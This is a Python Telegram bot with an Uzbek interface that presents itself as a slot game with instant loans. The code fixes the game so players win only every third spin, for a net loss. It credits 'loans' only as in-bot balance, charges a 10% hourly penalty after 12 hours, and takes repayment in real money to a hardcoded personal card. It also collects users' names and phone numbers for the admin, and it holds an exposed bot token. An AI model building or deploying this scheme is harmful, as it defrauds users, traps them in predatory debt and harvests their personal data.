import asyncio
import logging
import json
import os
import re
from datetime import datetime
from decimal import Decimal
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- 1. SOZLAMALAR ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
ADMIN_ID = 8299021738
ADMIN_KARTA = "9860 6067 5582 9722"
DB_FILE = "bank_system_v3.json"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- 2. BAZA TIZIMI ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            for uid in data:
                data[uid]['balance'] = Decimal(str(data[uid].get('balance', 0)))
                data[uid]['loan'] = Decimal(str(data[uid].get('loan', 0)))
            return data
    return {}

def save_db(data):
    to_save = {}
    for uid, val in data.items():
        to_save[uid] = val.copy()
        to_save[uid]['balance'] = float(val['balance'])
        to_save[uid]['loan'] = float(val['loan'])
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(to_save, f, indent=4, ensure_ascii=False)

users = load_db()

def get_u(uid):
    uid = str(uid)
    if uid not in users:
        users[uid] = {'name': '', 'phone': '', 'reg': False, 'balance': Decimal('0.0'), 'loan': Decimal('0.0'), 'loan_time': None, 'game_count': 0}
    return users[uid]

def get_finance(uid):
    u = get_u(uid)
    if not u['loan'] or u['loan'] <= 0: return Decimal('0.0'), Decimal('0.0'), Decimal('0.0')
    l_time = datetime.strptime(u['loan_time'], "%Y-%m-%d %H:%M:%S")
    passed_hours = (datetime.now() - l_time).total_seconds() / 3600
    penya = Decimal('0.0')
    if passed_hours > 12:
        penya = (u['loan'] * Decimal('0.10') * Decimal(str(passed_hours - 12))).quantize(Decimal('0.01'))
    return u['loan'], penya, (u['loan'] + penya).quantize(Decimal('0.01'))

# --- 3. KLAVIATURALAR ---
def main_kb(user_id):
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🎰 O'YINNI BOSHLASH"), types.KeyboardButton(text="👤 MA'LUMOTLARIM"))
    builder.row(types.KeyboardButton(text="💵 TEZKOR QARZ OLISH"), types.KeyboardButton(text="🏦 QARZNI YOPISH"))
    if user_id == ADMIN_ID:
        builder.row(types.KeyboardButton(text="📊 BARCHA FOYDALANUVCHILAR"))
    return builder.as_markup(resize_keyboard=True)

# --- 4. RO'YXATDAN O'TISH ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    u = get_u(message.from_user.id)
    if not u['reg']:
        await message.answer("🚀 **Xush kelibsiz!**\n\nTizimdan foydalanish uchun Ism va Familiyangizni yozib yuboring:")
    else:
        await message.answer("Tizim faol!", reply_markup=main_kb(message.from_user.id))

@dp.message(lambda m: not get_u(m.from_user.id)['reg'] and not m.contact)
async def reg_name(message: types.Message):
    uid = str(message.from_user.id)
    users[uid]['name'] = message.text
    save_db(users)
    kb = ReplyKeyboardBuilder().row(types.KeyboardButton(text="📱 RAQAMNI TASDIQLASH", request_contact=True))
    await message.answer(f"Rahmat, {message.text}! Endi pastdagi tugmani bosing:", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.contact)
async def reg_contact(message: types.Message):
    uid = str(message.from_user.id)
    if message.contact.user_id == message.from_user.id:
        users[uid]['phone'] = message.contact.phone_number
        users[uid]['reg'] = True
        save_db(users)
        
        # Adminni ogohlantirish
        await bot.send_message(ADMIN_ID, f"🆕 **YANGI FOYDALANUVCHI:**\n👤 Ism: {users[uid]['name']}\n📞 Tel: {users[uid]['phone']}\n🆔 ID: {uid}")
        
        await message.answer("✅ Ro'yxatdan o'tdingiz!", reply_markup=main_kb(message.from_user.id))

# --- 5. MA'LUMOTLAR TUGMASI ---
@dp.message(F.text == "👤 MA'LUMOTLARIM")
async def user_info(message: types.Message):
    uid = str(message.from_user.id)
    u = users[uid]
    l, p, total = get_finance(uid)
    await message.answer(
        f"👤 **SIZNING MA'LUMOTLARINGIZ:**\n\n"
        f"💳 Ism: {u['name']}\n"
        f"📞 Tel: {u['phone']}\n"
        f"💰 Balans: {u['balance']} UZS\n"
        f"🛑 Qarz: {total} UZS (Penya: {p})"
    )

@dp.message(F.text == "📊 BARCHA FOYDALANUVCHILAR")
async def admin_list(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    
    text = "📂 **FOYDALANUVCHILAR RO'YXATI:**\n\n"
    for uid, data in users.items():
        if data['reg']:
            l, p, total = get_finance(uid)
            text += f"👤 {data['name']}\n📞 {data['phone']}\n💰 Balans: {data['balance']}\n🛑 Qarz: {total}\nID: {uid}\n\n"
    
    if len(text) > 4000: # Telegram limitidan oshmaslik uchun
        await message.answer("Ro'yxat juda uzun, qismlarga bo'linmoqda...")
    await message.answer(text)

# --- 6. O'YIN (2-1 ALGORITMI) ---
@dp.message(F.text == "🎰 O'YINNI BOSHLASH")
async def start_game(message: types.Message):
    uid = str(message.from_user.id)
    u = users[uid]
    price, win = Decimal('250000.0'), Decimal('255000.0')

    if u['balance'] < price:
        return await message.answer("⚠️ Balansingizda pul yo'q! Qarz oling.")

    u['balance'] -= price
    u['game_count'] += 1
    save_db(users)
    await message.answer_dice("🎰")
    await asyncio.sleep(4)

    if u['game_count'] % 3 == 0:
        u['balance'] += win
        await message.answer(f"🎉 YUTUQ! +{win} UZS!")
    else:
        await message.answer("😟 Omad kelmadi. Yana urinib ko'ring!")
    save_db(users)

# --- 7. QARZ OLISH VA YOPISH ---
@dp.message(F.text == "💵 TEZKOR QARZ OLISH")
async def loan_offer(message: types.Message):
    u = get_u(message.from_user.id)
    if u['loan'] > 0: return await message.answer("⚠️ Avvalgi qarzingizni yoping!")
    kb = InlineKeyboardBuilder()
    kb.row(types.InlineKeyboardButton(text="💸 500k", callback_data="get_500000"),
           types.InlineKeyboardButton(text="💸 1M", callback_data="get_1000000"))
    await message.answer("Mablag'ni tanlang:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("get_"))
async def process_loan(call: types.CallbackQuery):
    uid = str(call.from_user.id)
    amt = Decimal(call.data.split("_")[1])
    users[uid]['loan'] = amt
    users[uid]['balance'] += amt
    users[uid]['loan_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_db(users)
    await call.message.edit_text(f"✅ {amt} UZS tushdi. 12 soatdan keyin 10% penya hisoblanadi!")

@dp.message(F.text == "🏦 QARZNI YOPISH")
async def pay_loan(message: types.Message):
    l, p, total = get_finance(message.from_user.id)
    if total <= 0: return await message.answer("Qarzingiz yo'q.")
    users[str(message.from_user.id)]['pay_step'] = 'amt'
    await message.answer(f"💳 Karta: `{ADMIN_KARTA}`\nTo'lov: {total} UZS\n\nSummani yozing:")

@dp.message(lambda m: get_u(m.from_user.id).get('pay_step') == 'amt')
async def pay_amt(message: types.Message):
    uid = str(message.from_user.id)
    amt = re.sub(r'\D', '', message.text)
    users[uid]['temp_pay'] = amt
    users[uid]['pay_step'] = 'conf'
    kb = ReplyKeyboardBuilder().row(types.KeyboardButton(text="Pul tashladim ✅"), types.KeyboardButton(text="Orqaga ❌"))
    await message.answer(f"Summa: {amt} UZS. Tasdiqlaysizmi?", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "Pul tashladim ✅")
async def notify_admin(message: types.Message):
    uid = str(message.from_user.id)
    u = users[uid]
    if u.get('pay_step') == 'conf':
        kb = InlineKeyboardBuilder()
        kb.row(types.InlineKeyboardButton(text="Tasdiqlayman ✅", callback_data=f"adm_ok_{uid}"),
               types.InlineKeyboardButton(text="Tasdiqlamayman ❌", callback_data=f"adm_no_{uid}"))
        await bot.send_message(ADMIN_ID, f"💰 **PUL TUSHDI!**\n👤 {u['name']}\n📞 {u['phone']}\n💵 Summa: {u['temp_pay']}", reply_markup=kb.as_markup())
        await message.answer("⌛️ Tekshirilmoqda...", reply_markup=main_kb(message.from_user.id))
        u['pay_step'] = None
        save_db(users)

@dp.callback_query(F.data.startswith("adm_"))
async def admin_res(call: types.CallbackQuery):
    action, uid = call.data.split("_")[1], call.data.split("_")[2]
    if action == "ok":
        users[uid]['loan'] = Decimal('0.0')
        users[uid]['loan_time'] = None
        save_db(users)
        await bot.send_message(uid, "✅ To'lov tasdiqlandi!")
        await call.message.edit_text("Bajarildi ✅")
    else:
        await bot.send_message(uid, "❌ To'lov rad etildi!")
        await call.message.edit_text("Rad etildi ❌")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
